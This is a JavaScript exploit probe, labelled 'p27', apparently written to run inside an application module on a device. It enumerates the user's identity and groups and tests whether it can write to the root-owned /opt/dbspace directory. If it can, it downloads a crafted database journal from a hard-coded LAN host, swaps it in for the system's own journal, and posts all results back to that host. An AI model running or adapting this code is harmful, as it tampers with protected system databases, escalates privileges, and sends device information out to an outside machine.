"use strict";
/* p27: can the module write /opt/dbspace directly? (group system_share) If yes: deliver journal in place */
var fs = require('fs');
var cp = require('child_process');
var net = require('net');
var http = require('http');
var crypto = require('crypto');
var HOST = '192.168.1.62', PORT = 9999;
var R = { ts: new Date().toISOString(), probe: 'p27', results: {}, log: [] };
function L(s){ R.log.push(String(s).substring(0,500)); }
function run(cmd, timeout){
  try { return cp.execSync(cmd, {timeout:timeout||30000, maxBuffer:16*1024*1024}).toString().trim(); }
  catch(e){ var o=''; if(e.stdout)o+=e.stdout.toString(); if(e.stderr)o+=(o?'\n':'')+e.stderr.toString();
    return '[exit '+(e.status!=null?e.status:'?')+'] '+(o||(e&&e.message)||'unknown'); }
}
function postRaw(path, text){
  var buf = new Buffer(text,'utf8');
  var hdr = 'POST '+path+' HTTP/1.1\r\nHost: '+HOST+':9999\r\nContent-Type: text/plain\r\nContent-Length: '+buf.length+'\r\nConnection: close\r\n\r\n';
  try { var s=net.connect(PORT,HOST); s.on('connect',function(){ s.write(hdr); var off=0,iv=setInterval(function(){ if(off>=buf.length){clearInterval(iv);setTimeout(function(){s.destroy();},3000);return;} s.write(buf.slice(off,off+4096)); off+=4096;},100); setTimeout(function(){s.destroy();},120000);}); s.on('error',function(e){L('post err '+e.message);}); } catch(e){ L('post ctor '+e); }
}
function md5file(p){ try { return crypto.createHash('md5').update(fs.readFileSync(p)).digest('hex'); } catch(e){ return 'err '+e; } }

R.results.identity = run('id 2>&1; echo ---; id -G 2>&1; echo ---; id -Gn 2>&1; echo ---USER---; whoami 2>&1', 10000);
R.results.group_system_share = run("grep system_share /etc/group 2>&1", 10000);
R.results.dbspace_perm = run('ls -ld /opt/dbspace 2>&1', 10000);

// write test
R.results.write_test = run('touch /opt/dbspace/.t27test 2>&1 && ls -la /opt/dbspace/.t27test 2>&1 && rm /opt/dbspace/.t27test 2>&1 && echo WRITABLE_OK || echo WRITABLE_FAIL', 15000);
// rename test (delete existing root file + create new)
R.results.rename_test = run('echo x > /tmp/.t27r 2>&1 && mv /tmp/.t27r /opt/dbspace/.t27rename 2>&1 && ls -la /opt/dbspace/.t27rename 2>&1 && rm /opt/dbspace/.t27rename 2>&1 && echo RENAME_OK || echo RENAME_FAIL', 15000);
// can I read the root journal file?
R.results.journal_readable = run('md5sum /opt/dbspace/.app-context.db-journal 2>&1', 10000);

function finish(){ R.results.final='done '+new Date().toISOString(); postRaw('/p27info', JSON.stringify(R)); L('p27 done'); }

function deliver(){
  // 1. fetch journal from Mac into /tmp
  var tmp = '/tmp/.t27_journal';
  var got = false;
  var req = http.get('http://192.168.1.62:9999/appctx_hot_journal', function(res){
    var chunks = [];
    res.on('data', function(c){ chunks.push(c); });
    res.on('end', function(){
      var buf = Buffer.concat(chunks);
      fs.writeFileSync(tmp, buf);
      got = true;
      L('journal fetched ' + buf.length + ' bytes');
      // 2. verify md5
      var gotmd5 = md5file(tmp);
      R.results.fetched_md5 = gotmd5;
      if (gotmd5 === '03683f81d337ce2224df6010456738e9') {
        // 3. rm old journal, copy new into place
        R.results.deliver_rm = run('rm -f /opt/dbspace/.app-context.db-journal 2>&1', 10000);
        R.results.deliver_cp = run('cp /tmp/.t27_journal /opt/dbspace/.app-context.db-journal 2>&1', 10000);
        R.results.journal_after = run('md5sum /opt/dbspace/.app-context.db-journal 2>&1', 10000);
        R.results.dbspace_after = run('ls -la /opt/dbspace/ 2>&1 | head -30', 10000);
        R.results.live_after = run('md5sum /opt/dbspace/.app-context.db 2>&1', 10000);
        run('rm -f /tmp/.t27_journal', 5000);
      } else {
        R.results.deliver_note = 'md5 mismatch, not delivered';
      }
      finish();
    });
  });
  req.on('error', function(e){ R.results.fetch_err = String(e); finish(); });
  req.on('timeout', function(){ req.abort(); R.results.fetch_err='timeout'; finish(); });
}

var writable = R.results.write_test.indexOf('WRITABLE_OK') >= 0;
var renamable = R.results.rename_test.indexOf('RENAME_OK') >= 0;
R.results.can_write = writable || renamable;
if (writable || renamable) {
  L('dbspace writable — delivering journal');
  deliver();
} else {
  R.results.note = 'dbspace NOT writable from module context';
  finish();
}
